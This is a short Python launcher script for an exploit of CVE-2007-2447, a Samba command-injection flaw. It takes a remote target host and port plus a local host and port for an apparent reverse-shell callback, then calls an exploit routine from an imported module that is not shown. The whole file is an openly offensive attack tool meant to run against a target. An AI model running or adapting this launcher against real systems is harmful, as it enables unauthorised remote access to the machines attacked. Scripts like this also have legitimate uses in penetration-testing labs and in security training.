import sys
import argparse
from src import CVE


def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2007-2447 Exploit")
    parser.add_argument('-rh', '--rhost', dest='rhost', help='remote host')
    parser.add_argument('-rp', '--rport', dest='rport', help='remote port', default=365)
    parser.add_argument('-lh', '--host', dest='lhost', help='local host')
    parser.add_argument('-p', '--port', dest='lport', help='local port')
    args = parser.parse_args()

    if not args.rhost or not args.rport or not args.lhost or not args.lport:
        parser.print_usage()
        sys.exit()

    return args


if __name__ == '__main__':
    args = parse_args()
    cve = CVE(host=args.rhost, port=args.rport, lhost=args.lhost, lport=args.lport)
    cve.exploit()
